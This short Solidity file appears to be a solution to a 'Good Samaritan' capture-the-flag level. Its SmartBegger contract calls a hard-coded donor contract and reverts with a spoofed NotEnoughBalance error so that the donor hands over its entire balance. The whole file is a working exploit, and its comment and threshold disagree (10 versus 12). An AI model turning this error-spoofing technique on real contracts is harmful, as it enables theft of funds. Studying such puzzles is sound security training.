//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
pragma experimental ABIEncoderV2;

// Key is to create a smart contract that reverts when the amount is less than 10, this way 
// the samaritan sends all tokens next time.
interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance); 
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract SmartBegger is INotifyable {
    IGoodSamaritan samaritan = IGoodSamaritan(0x9C2f2467d7B64DD7a402d4065cFbd51e59D852C7);

    error NotEnoughBalance();
    

    function notify(uint256 amount) external {
        if (amount < 12) {
            revert NotEnoughBalance();
        }
    }

    function beg() external {
        samaritan.requestDonation();
    }
    fallback() external payable {}
}
